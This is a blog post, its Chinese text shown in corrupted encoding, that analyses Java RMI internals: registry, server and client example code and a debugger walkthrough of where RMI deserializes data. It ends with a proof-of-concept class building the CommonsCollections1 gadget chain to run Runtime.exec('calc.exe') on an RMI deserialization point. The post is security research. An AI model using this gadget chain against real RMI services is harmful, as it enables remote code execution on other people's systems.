<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=HandheldFriendly content="True"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Cache-Control content="no-transform"><meta http-equiv=Cache-Control content="no-siteapp"><meta name=generator content="Hugo 0.139.4"><link rel=apple-touch-icon sizes=180x180 href=/favicon/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon/favicon-16x16.png><link rel=manifest href=/favicon/site.webmanifest><link rel=mask-icon href=/favicon/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>Java RMI - zrquan</title>
<meta name=author content="zrquan"><meta name=description content="A minimal Hugo theme with nice theme color."><meta name=keywords content="java"><meta property="og:title" content="Java RMI"><meta name=twitter:title content="Java RMI"><meta property="og:type" content="article"><meta property="og:url" content="https://zrquan.github.io/posts/java-rmi/"><meta property="og:description" content><meta name=twitter:description content><meta property="og:image" content="https://zrquan.github.io/img/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://zrquan.github.io/img/og.png"><meta property="article:published_time" content="2021-03-08T00:00:00+08:00"><meta property="article:modified_time" content="2021-03-08T00:00:00+08:00"><style>@media(prefers-color-scheme:dark){body[data-theme=auto] img{filter:brightness(60%)}}body[data-theme=dark] img{filter:brightness(60%)}</style><link rel=stylesheet href=https://zrquan.github.io/assets/css/fuji.min.4c44b7b7f176c7ea2e7d3a85a954d45c0d3e801e81eacbad84c7f9575b51e65dc11b59ff1a372389e8b4e0821d6bbb5a668fe9c3e77af9418acb79126a035a1f.css integrity="sha512-TES3t/F2x+oufTqFqVTUXA0+gB6B6suthMf5V1tR5l3BG1n/Gjcjiei04IIda7taZo/pw+d6+UGKy3kSagNaHw=="></head><body data-theme=auto data-theme-auto=false><script data-cfasync=false>var fujiThemeData=localStorage.getItem("fuji_data-theme");fujiThemeData?fujiThemeData!=="auto"&&document.body.setAttribute("data-theme",fujiThemeData==="dark"?"dark":"light"):localStorage.setItem("fuji_data-theme","auto")</script><header></header><main><div class="container-lg clearfix"><div class="col-12 col-md-9 float-left content"><article><h1 class="post-item post-title"><a href=https://zrquan.github.io/posts/java-rmi/>Java RMI</a></h1><div class="post-item post-meta"><span><i class="iconfont icon-today-sharp"></i>&nbsp;2021-03-08</span>
<span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;4145 words</span>
<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href=/tags/java>java</a>&nbsp;</span></div><div class="post-content markdown-body"><h2 id=rmi-101>RMI 101</h2><p>RMI(Remote Method Invocation)å³è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œæ˜¯ä¸€ç§åˆ†å¸ƒå¼å¯¹è±¡é€šä¿¡æŠ€æœ¯ï¼Œå®ƒä½¿å®¢æˆ·æœºä¸­çš„ç¨‹åºå¯ä»¥åƒè°ƒç”¨æœ¬åœ°å¯¹è±¡ä¸€æ ·è°ƒç”¨è¿œç¨‹æœåŠ¡æœºçš„å¯¹è±¡æ–¹æ³•ï¼Œè€Œä¸éœ€è¦å…³å¿ƒç½‘ç»œé€šä¿¡çš„ç»†èŠ‚ã€‚</p><p>Java RMI çš„è¿œç¨‹é€šä¿¡è¿‡ç¨‹ä¸­åˆ†ä¸º client å’Œ serverï¼Œè€Œåœ¨ä¸¤ç«¯çš„ç¨‹åºä¸­ï¼Œè´Ÿè´£å¤„ç†é€šä¿¡ç»†èŠ‚çš„å¯¹è±¡åˆ†åˆ«ç§°ä¸º stub å’Œ skeletonã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºè°ƒç”¨ä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œå®é™…æ˜¯ç”± stub å¯¹è±¡è·å–ç›¸å…³ä¿¡æ¯å¹¶å‘ skeleton å‘é€è¯·æ±‚ï¼Œskeleton å¯¹è±¡è·å–åˆ°ç»“æœåå†è¿”å›ç»™ stub å¯¹è±¡ï¼Œæœ€åè¿”å›åˆ°æˆ‘ä»¬çš„ä»£ç ä¸­ã€‚</p><p>æ­¤å¤–ï¼Œå¹¶ä¸æ˜¯ JVM ä¸­çš„æ‰€æœ‰å¯¹è±¡éƒ½èƒ½è¢«è¿œç¨‹è°ƒç”¨çš„ï¼Œä¸€ä¸ªèƒ½è¢«è¿œç¨‹è°ƒç”¨çš„å¯¹è±¡éœ€è¦å®ç°ä¸€ä¸ªç»§æ‰¿äº† Remote æ¥å£çš„æ¥å£ï¼Œå¹¶ä¸”åœ¨ Registry(æ³¨å†Œä¸­å¿ƒ)æ³¨å†ŒæœåŠ¡ã€‚Client ç«¯åœ¨
Registry æŸ¥è¯¢è¿œç¨‹å¯¹è±¡å¹¶è·å– stub åï¼Œæ‰èƒ½ç›´æ¥å’Œ Server ç«¯è¿›è¡Œé€šä¿¡ã€‚</p><figure><img src=/ox-hugo/rmi.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/rmi.png></figure><h2 id=ä»£ç åˆ†æ>ä»£ç åˆ†æ</h2><h3 id=ç¤ºä¾‹ä»£ç >ç¤ºä¾‹ä»£ç </h3><p>ä¸‹é¢é€šè¿‡ç®€å•çš„ç¤ºä¾‹ä»£ç ï¼Œæ¥å®ç° RMI è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯ <code>jdk1.7.0_02</code></p><p>é¦–å…ˆéœ€è¦å®šä¹‰ä¸€ä¸ªå¯ä»¥è¢«è¿œç¨‹è°ƒç”¨çš„ç±»ï¼Œå®ƒè¦ç»§æ‰¿ Remote æ¥å£ã€‚Remote æ¥å£æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œå’Œ Serializable æ¥å£ä¸€æ ·èµ·åˆ°æ ‡è®°çš„ä½œç”¨ï¼Œè¯´æ˜å®ç°å®ƒçš„ç±»å¯ä»¥è¢«è¿œç¨‹è°ƒç”¨ï¼Œå…¶ä¸­çš„æ–¹æ³•éœ€è¦æŠ›å‡º RemoteException å¼‚å¸¸ã€‚</p><details><summary>interface User extends Remote</summary><p class=details><pre><code class=language-java>public interface User extends Remote {
    void register(String uname) throws RemoteException;
    boolean login(String pwd) throws RemoteException;
    String getName() throws RemoteException;
}
</code></pre></p></details><details><summary>class UserImpl</summary><p class=details><pre><code class=language-java>// java.rmi.server.UnicastRemoteObjectçš„æ„é€ å‡½æ•°å°†ç”Ÿæˆstubå’Œskeleton
public class UserImpl extends UnicastRemoteObject implements User {
    String name;

    // å¿…é¡»æœ‰ä¸€ä¸ªæ˜¾å¼çš„æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”è¦æŠ›å‡ºRemoteExceptionå¼‚å¸¸
    public UserImpl() throws RemoteException {};

    @Override
    public void register(String uname) throws RemoteException {
        this.name = uname;
        System.out.println(&quot;Register called: username is &quot; + uname);
    }

    @Override
    public boolean login(String pwd) throws RemoteException {
        System.out.println(&quot;Login succeed, password is &quot; + pwd);
        return true;
    }

    @Override
    public String getName() throws RemoteException {
        return this.name;
    }
}
</code></pre></p></details><p>æ¥ç€æ˜¯ Server ç«¯çš„å®ç°ç±»ï¼Œåœ¨æ­¤åˆ›å»ºä¸€ä¸ªæ³¨å†Œè¡¨(Registry)å¹¶ç»‘å®šè¿œç¨‹å¯¹è±¡ã€‚</p><details><summary>class UserServer</summary><p class=details><pre><code class=language-java>public class UserServer {
    public static void main(String[] args) throws Exception{
        // é»˜è®¤ç«¯å£æ˜¯tcp 1099
        Registry registry = LocateRegistry.createRegistry(3333);
        registry.bind(&quot;User&quot;, new UserImpl());
        System.out.println(&quot;RMI server is ready.&quot;);
    }
}
</code></pre></p></details><p>å®é™…ä¸Š Registry å’Œ Server æ˜¯ä¸åŒçš„å®ä½“ï¼Œä½ å¯ä»¥åœ¨ä¸åŒçš„ç±»(æ–‡ä»¶)ä¸­åˆ›å»ºï¼Œåœ¨ä½ç‰ˆæœ¬çš„ JDK
ä¸­ç”šè‡³å¯ä»¥æ”¾åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œä½†é«˜ç‰ˆæœ¬çš„ JDK ä¼šè¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœä¸åœ¨åŒä¸€å°æœåŠ¡å™¨å°±æ— æ³•æ³¨å†ŒæˆåŠŸã€‚</p><p>æœ€åæ˜¯ Client ç«¯çš„å®ç°ç±»ï¼Œå®ƒéœ€è¦å…ˆè·å–æ³¨å†Œè¡¨çš„å¼•ç”¨ï¼Œå†é€šè¿‡æ³¨å†Œè¡¨è·å–è¿œç¨‹å¯¹è±¡ã€‚ç”±äºè¦è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ï¼Œæ‰€ä»¥ Client ç«¯ä¹Ÿéœ€è¦æœ‰è¯¥å¯¹è±¡çš„æ¥å£å®šä¹‰ã€‚</p><details><summary>class UserClient</summary><p class=details><pre><code class=language-java>public class UserClient {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.getRegistry(3333);
        User userClient = (User) registry.lookup(&quot;User&quot;);
        userClient.register(&quot;zrquan&quot;);
        userClient.login(&quot;123&quot;);
        System.out.println(&quot;Username is &quot; + userClient.getName());
    }
}
</code></pre></p></details><h3 id=register>Register</h3><p>è·å–æ³¨å†Œä¸­å¿ƒæœ‰ä¸¤ç§æ–¹å¼â€”â€”ä¸€ç§æ˜¯ <code>LocateRegistry.createRegistry()</code> ï¼Œåœ¨åˆ›å»ºæ—¶ä»æœ¬åœ°è·å–ï¼›å¦ä¸€ç§æ˜¯ <code>LocateRegistry.getRegistry()</code> ï¼Œå¯ä»¥è¿œç¨‹è·å–æ³¨å†Œä¸­å¿ƒã€‚åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œ
server ç«¯ä½¿ç”¨çš„æ˜¯ç¬¬ä¸€ç§æ–¹å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆè·Ÿè¿› createRegistry æ–¹æ³•ã€‚</p><p>æ–¹æ³•å®é™…è¿”å›çš„æ˜¯ä¸€ä¸ª RegistryImpl å¯¹è±¡ï¼Œåˆå§‹åŒ–è¯¥å¯¹è±¡æ—¶æ‰§è¡Œå…¶ç§æœ‰æ–¹æ³• <code>setup()</code></p><figure><img src=/ox-hugo/2021-02-08_20-32-23_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-08_20-32-23_screenshot.png></figure><p>åœ¨ä¸Šå›¾çš„ LiveRef å¯¹è±¡ä¸­åŒ…å« IPã€ç«¯å£ç­‰ä¿¡æ¯ï¼Œå¹¶å°è£…è¿› UnicastServerRef å¯¹è±¡ï¼Œç„¶åæ‰§è¡Œ
UnicastServerRef çš„ exportObject æ–¹æ³•ï¼Œç”Ÿæˆ stub å’Œ skel å¯¹è±¡ã€‚</p><figure><img src=/ox-hugo/2021-02-08_21-08-18_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-08_21-08-18_screenshot.png></figure><p>å¯¹ç…§ UnicastServerRef å¯¹è±¡çš„æˆå‘˜å˜é‡å’Œè°ƒç”¨æ ˆï¼Œå¯ä»¥çœ‹åˆ°ç»è¿‡å‡ ä¸ª exportObject æ–¹æ³•ä¹‹åæ‰§è¡Œåˆ° TCPTransport çš„ listen æ–¹æ³•ä¸­ã€‚</p><figure><img src=/ox-hugo/2021-02-08_20-47-36_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-08_20-47-36_screenshot.png></figure><figure><img src=/ox-hugo/2021-02-08_21-12-22_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-08_21-12-22_screenshot.png></figure><p>ä¸Šå›¾çš„ 225 è¡Œè°ƒç”¨ <code>TCPEndpoint.newServerSocket()</code> åå¼€å¯ç«¯å£ç›‘å¬ï¼Œ227 è¡Œè°ƒç”¨ start
å¯åŠ¨çº¿ç¨‹ï¼Œæ‰§è¡Œ <code>TCPTransport$AcceptLoop</code> çš„ run æ–¹æ³•ã€‚</p><figure><img src=/ox-hugo/2021-02-08_22-27-19_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-08_22-27-19_screenshot.png></figure><p>æ‰§è¡Œåˆ° <code>ServerSocket.accept()</code> åç¨‹åºé˜»å¡ï¼Œç­‰å¾… server ç«¯æˆ– client ç«¯çš„è¯·æ±‚ã€‚</p><p>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹ <code>LocateRegistry.getRegistry()</code> ï¼Œå®ƒæœ‰å‡ ä¸ªé‡è½½æ–¹æ³•ï¼Œå…·ä½“çš„å®ç°åœ¨ä»¥ä¸‹æ–¹æ³•ä¸­ï¼š</p><pre><code class=language-java>public static Registry getRegistry(String host, int port, RMIClientSocketFactory csf) throws RemoteException
{
    Registry registry = null;

    if (port &lt;= 0) port = Registry.REGISTRY_PORT;

    if (host == null || host.length() == 0) {
        try {
            host = java.net.InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            host = &quot;&quot;;
        }
    }

    LiveRef liveRef =
        new LiveRef(new ObjID(ObjID.REGISTRY_ID),
                    new TCPEndpoint(host, port, csf, null),
                    false);
    RemoteRef ref = (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef);

    return (Registry) Util.createProxy(RegistryImpl.class, ref, false);
}
</code></pre><p>å¦‚æœæ²¡æœ‰æä¾› IP å’Œç«¯å£ï¼Œé»˜è®¤ä½¿ç”¨æœ¬æœºåœ°å€å’Œ 1099 ç«¯å£ï¼Œç„¶åå°†å®ƒä»¬å°è£…åˆ° LiveRef å¯¹è±¡ä¸­ï¼Œå’Œ createRegistry æ—¶ç±»ä¼¼ã€‚ä¸è¿‡åé¢å°†è¿™ä¸ªå¯¹è±¡æ”¾å…¥ UnicastRef è€Œä¸æ˜¯ UnicastServerRefã€‚</p><p>è¿›å…¥ createProxy æ–¹æ³•ï¼Œå†åˆ° createStub æ–¹æ³•ï¼š</p><figure><img src=/ox-hugo/2021-02-25_22-27-31_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-25_22-27-31_screenshot.png></figure><p>é€šè¿‡åå°„å¾—åˆ° RegistryImpl_Stub å¯¹è±¡ï¼Œå¹¶å°†è¿œç¨‹é€šä¿¡éœ€è¦çš„ IP å’Œç«¯å£ä¿¡æ¯ä¿å­˜åˆ° ref å±æ€§ä¸­ã€‚</p><figure><img src=/ox-hugo/2021-02-25_22-30-17_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-25_22-30-17_screenshot.png></figure><h3 id=server>Server</h3><p>åˆ›å»ºæ³¨å†Œä¸­å¿ƒåï¼Œserver ç«¯é€šè¿‡ bind æ–¹æ³•æ³¨å†Œè¿œç¨‹å¯¹è±¡ã€‚</p><pre><code class=language-java>registry.bind(&quot;User&quot;, new UserImpl());
</code></pre><p>ç„¶è€Œæ­¤æ—¶ registry çº¿ç¨‹å¹¶æ²¡æœ‰æ”¶åˆ° socket è¯·æ±‚ï¼Œä¹Ÿæ²¡æœ‰è§¦å‘ååºåˆ—åŒ–è¿‡ç¨‹ğŸ¤”</p><p>å‰é¢æåˆ°é€šè¿‡ createRegistry è·å–åˆ°çš„æ˜¯ RegistryImpl å¯¹è±¡ï¼Œçœ‹ä¸€ä¸‹å®ƒçš„ bind æ–¹æ³•ï¼š</p><figure><img src=/ox-hugo/2021-02-24_18-04-42_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-24_18-04-42_screenshot.png></figure><p>ç”±æ­¤å¯è§ RegistryImpl å¯¹è±¡æ˜¯å¯¹æœ¬åœ°çš„æ³¨å†Œä¸­å¿ƒè¿›è¡Œæ“ä½œï¼Œè‡ªç„¶ä¸æ¶‰åŠ socket å’Œåºåˆ—åŒ–ï¼Œåªéœ€è¦å°†æ³¨å†Œå¯¹è±¡æ·»åŠ åˆ°å“ˆå¸Œè¡¨(this.bindings)ä¸­å³å¯ã€‚</p><p>æ”¹ä¸ºä½¿ç”¨ getRegistry è·å–æ³¨å†Œä¸­å¿ƒï¼Œæ­¤æ—¶è¿”å›çš„æ˜¯ RegistryImpl_Stub å¯¹è±¡ï¼Œå®ƒçš„ bind æ–¹æ³•å¦‚ä¸‹ï¼š</p><pre><code class=language-java>public void bind(String var1, Remote var2) throws AccessException, AlreadyBoundException, RemoteException {
    try {
        RemoteCall var3 = super.ref.newCall(this, operations, 0, 4905912898345647071L);

        try {
            ObjectOutput var4 = var3.getOutputStream();
            var4.writeObject(var1);
            var4.writeObject(var2);
        } catch (IOException var5) {
            throw new MarshalException(&quot;error marshalling arguments&quot;, var5);
        }

        super.ref.invoke(var3);
        super.ref.done(var3);
    } catch (RuntimeException var6) {
        throw var6;
    } catch (RemoteException var7) {
        throw var7;
    } catch (AlreadyBoundException var8) {
        throw var8;
    } catch (Exception var9) {
        throw new UnexpectedException(&quot;undeclared checked exception&quot;, var9);
    }
}
</code></pre><p>newCall æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•° operations ä¿å­˜ç€ä¸€ä¸ªåˆ—è¡¨ï¼Œå¯¹åº”ç€ registry çš„å„ç§æ“ä½œï¼š</p><figure><img src=/ox-hugo/2021-02-25_17-14-18_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-25_17-14-18_screenshot.png></figure><p>å¯ä»¥çœ‹åˆ° bind å¯¹åº”çš„ä¸‹æ ‡æ˜¯ 0ï¼Œè€Œæ­¤æ—¶ç¬¬ä¸‰ä¸ªå‚æ•°(opnum)ä¹Ÿæ˜¯ 0ã€‚</p><p>è·Ÿè¿› newCallï¼š</p><figure><img src=/ox-hugo/2021-02-25_17-20-13_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-25_17-20-13_screenshot.png></figure><p>åœ¨ 193 è¡Œå’Œ registry è¿›è¡Œé€šä¿¡ï¼Œè·å– Connection å¯¹è±¡ï¼Œåœ¨åˆ›å»º StreamRemoteCall å¯¹è±¡æ—¶ä¼ è¿›å‚æ•° 0ï¼Œè®© registry çŸ¥é“è¦æ‰§è¡Œçš„æ˜¯ bind æ“ä½œã€‚</p><p>è¿™æ—¶å€™è·Ÿè¿›ä¸€ä¸‹ registry çš„ä»£ç ï¼Œåœ¨æ‹¿åˆ° socket å¯¹è±¡åç»§ç»­æ‰§è¡Œï¼Œå¹¶åˆ›å»ºä¸€ä¸ª
ConnectionHandler çº¿ç¨‹æ¥å¤„ç†è¯·æ±‚ã€‚</p><figure><img src=/ox-hugo/2021-02-25_23-59-17_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-25_23-59-17_screenshot.png></figure><p>ä» ConnectionHandler#run è·Ÿè¿›åˆ° TCPTransport#handleMessagesï¼Œå‡½æ•°æ ˆå¦‚ä¸‹ï¼š</p><figure><img src=/ox-hugo/2021-02-26_00-06-15_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_00-06-15_screenshot.png></figure><p>åœ¨ switch è¯­å¥ä¸­åˆ›å»ºä¸€ä¸ª StreamRemoteCall å¯¹è±¡ï¼Œå¹¶ä¼ å…¥å½“å‰çš„ TCPConnection å¯¹è±¡ï¼š</p><figure><img src=/ox-hugo/2021-02-26_00-09-24_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_00-09-24_screenshot.png></figure><p>è·Ÿè¿› TCPTransport#serviceCallï¼Œè·å– ObjID å’Œ Target å¯¹è±¡ï¼Œç„¶åè°ƒç”¨
UnicastServerRef#dispatch æ–¹æ³•ï¼š</p><figure><img src=/ox-hugo/2021-02-26_10-35-52_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_10-35-52_screenshot.png></figure><p>å½“ <code>this.skel</code> ä¸ä¸º nullï¼Œå°±è°ƒç”¨ UnicastServerRef#oldDispatchï¼š</p><figure><img src=/ox-hugo/2021-02-26_10-40-03_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_10-40-03_screenshot.png></figure><p>æ¥ç€æ‰§è¡Œ <code>this.skel.dispatch()</code> ï¼Œå³ RegistryImpl_Skel#dispatchï¼Œè¯¥æ–¹æ³•åŒ…æ‹¬å¤„ç†è¯·æ±‚çš„æ ¸å¿ƒé€»è¾‘ï¼š</p><figure><img src=/ox-hugo/2021-02-26_10-55-51_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_10-55-51_screenshot.png></figure><p>switch è¯­å¥çš„å‚æ•° var3 å°±æ˜¯ server ç«¯ä¼ è¿‡æ¥çš„ opnumï¼Œå¯¹åº”çš„æ“ä½œåœ¨ä¹‹å‰çš„æˆªå›¾ä¸­ã€‚</p><p>å¯ä»¥çœ‹åˆ° bind å’Œ rebind éƒ½æœ‰ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œlookup å’Œ unbind ä¹Ÿå­˜åœ¨ååºåˆ—åŒ–ï¼Œä½†ç”±äºå‚æ•°æ˜¯ String ç±»å‹ï¼Œå¹¶ä¸èƒ½ç›´æ¥åˆ©ç”¨ã€‚</p><p>ä¸Šå›¾çš„ var6 æ˜¯ RegistryImpl å¯¹è±¡ï¼Œå› æ­¤æœ€ç»ˆè¿˜æ˜¯ä¼šæ‰§è¡Œ RegistryImpl#bind æ–¹æ³•ã€‚</p><p>å›åˆ° server ç«¯ï¼Œå³ RegistryImpl_Stub#bind æ–¹æ³•ä¸­ï¼Œå‘è¾“å‡ºæµå†™å…¥åºåˆ—åŒ–åçš„è¿œç¨‹å¯¹è±¡å’Œå®ƒçš„åç§°ã€‚æ‰§è¡Œ <code>super.ref.invoke()</code> å‘é€è¯·æ±‚ç»™ registryï¼Œç”±
RegistryImpl_Skel#dispatch å¤„ç†è¯·æ±‚ã€‚</p><h3 id=client>Client</h3><p>client ç«¯å’Œ server ç«¯çš„é€šä¿¡å‘ç”Ÿåœ¨è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œåœ¨æ­¤ä¹‹å‰éœ€è¦é€šè¿‡
RegistryImpl_Stub#lookup ä»æ³¨å†Œä¸­å¿ƒè·å–å°è£…å¥½çš„ä»£ç†å¯¹è±¡ã€‚</p><figure><img src=/ox-hugo/2021-02-26_13-22-26_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_13-22-26_screenshot.png></figure><p>è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„ä»»æ„æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šå…ˆè°ƒç”¨ RemoteObjectInvocationHandler#invokeï¼š</p><figure><img src=/ox-hugo/2021-02-26_13-59-07_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_13-59-07_screenshot.png></figure><p>ä¸Šå›¾åˆ¤æ–­è°ƒç”¨çš„æ–¹æ³•æ˜¯ä¸æ˜¯æ‰€æœ‰å¯¹è±¡å…±æœ‰çš„ï¼Œå¦‚æœä¸æ˜¯å°±æ‰§è¡Œ invokeRemoteMethodã€‚</p><p>æ¥ç€è°ƒç”¨ LiveRef#invoke æ–¹æ³•(ç”± lookup è·å–)ï¼ŒæŠŠ proxyã€methodã€args ä»¥åŠ method çš„ hash
ä¼ è¿‡å»ï¼š</p><figure><img src=/ox-hugo/2021-02-26_14-11-56_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_14-11-56_screenshot.png></figure><p>è·Ÿè¿› LiveRef#invokeï¼š</p><figure><img src=/ox-hugo/2021-02-26_14-20-24_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_14-20-24_screenshot.png></figure><p>è·å–åˆ° Connection å¯¹è±¡åï¼Œè°ƒç”¨ marshaValue å°†è¿œç¨‹æ–¹æ³•çš„å‚æ•°åºåˆ—åŒ–å†™å…¥åˆ°è¿æ¥ä¸­ï¼š</p><figure><img src=/ox-hugo/2021-02-26_14-27-26_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_14-27-26_screenshot.png></figure><p>æ¥ç€å°†è¾“å‡ºæµçš„æ•°æ®å‘é€åˆ° server ç«¯ï¼Œè·å–å“åº”åè°ƒç”¨ unmarsharValue è¿›è¡Œååºåˆ—åŒ–ï¼š</p><figure><img src=/ox-hugo/2021-02-26_14-32-21_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_14-32-21_screenshot.png></figure><figure><img src=/ox-hugo/2021-02-26_14-33-37_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_14-33-37_screenshot.png></figure><p>åœ¨ server ç«¯è´Ÿè´£å¤„ç†è¯·æ±‚çš„æ–¹æ³•æ˜¯ UnicastServerRef#dispatchï¼Œè°ƒç”¨ unmarshaValue å¯¹å‚æ•°è¿›è¡Œå¤„ç†ï¼š</p><figure><img src=/ox-hugo/2021-02-26_14-46-47_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_14-46-47_screenshot.png></figure><p>å¦‚æœå‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨ unmarshaValue ä¸­ä¼šå°†å…¶ååºåˆ—åŒ–ï¼Œç„¶åé€šè¿‡åå°„è°ƒç”¨è¿œç¨‹æ–¹æ³•ã€‚</p><figure><img src=/ox-hugo/2021-02-26_14-53-07_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_14-53-07_screenshot.png></figure><figure><img src=/ox-hugo/2021-02-26_14-54-21_screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/2021-02-26_14-54-21_screenshot.png></figure><p>åé¢çš„æµç¨‹å°±ä¸ç»§ç»­è·Ÿè¿›äº†ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“ client ç«¯å’Œ server ç«¯é€šä¿¡æ—¶è°ƒç”¨äº†
unmarshaValue æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ç›¸å…³æ“ä½œï¼Œè¿™ä¹Ÿæ­£æ˜¯æ”»å‡»çš„å…¥å£ç‚¹ã€‚</p><h2 id=æ”»å‡»é€”å¾„>æ”»å‡»é€”å¾„</h2><p>å‰æ–‡å¤§è‡´åˆ†æäº†ä¸€ä¸‹ Java RMI ä¸­å„ä¸ªè§’è‰²æ˜¯æ€ä¹ˆè¿›è¡Œäº¤äº’çš„ï¼Œä»¥åŠä»£ç æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸€äº›æ¶‰åŠåˆ°ååºåˆ—åŒ–çš„ç‚¹ã€‚ä¸‹é¢å°±é’ˆå¯¹è¿™äº›ååºåˆ—åŒ–çš„ç‚¹è¿›è¡Œæ¨¡æ‹Ÿæ”»å‡»ï¼Œä»¥æ­¤äº†è§£é’ˆå¯¹ Java RMI æœåŠ¡éƒ½æœ‰å“ªäº›å¸¸è§çš„æ”»å‡»é€”å¾„ã€‚</p><p>æ”»å‡»æ—¶æ‰€ä½¿ç”¨çš„ POP é“¾æ˜¯ CommonsCollections1ï¼Œå¯ä»¥åœ¨<a href=/posts/ysoserial-cc1/>è¿™ç¯‡æ–‡ç« </a>äº†è§£ä¸€ä¸‹ã€‚å…ˆå†™ä¸€ä¸ª Poc
ç±»æ–¹ä¾¿ç”Ÿæˆæ¶æ„å¯¹è±¡ï¼š</p><pre><code class=language-java>public class Poc {
    Remote getObject() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;,
                        new Class[] {String.class, Class[].class},
                        new Object[] {&quot;getRuntime&quot;, new Class[0]}),
                new InvokerTransformer(&quot;invoke&quot;,
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0] }),
                new InvokerTransformer(&quot;exec&quot;,
                        new Class[] {String.class},
                        new Object[] {&quot;calc.exe&quot;})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put(&quot;value&quot;, &quot;zrquan&quot;);
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        Class AnnotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
        // ç”¨Remoteä»£ç†å¯¹è±¡å°è£…evalObject
        return Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
    }
}
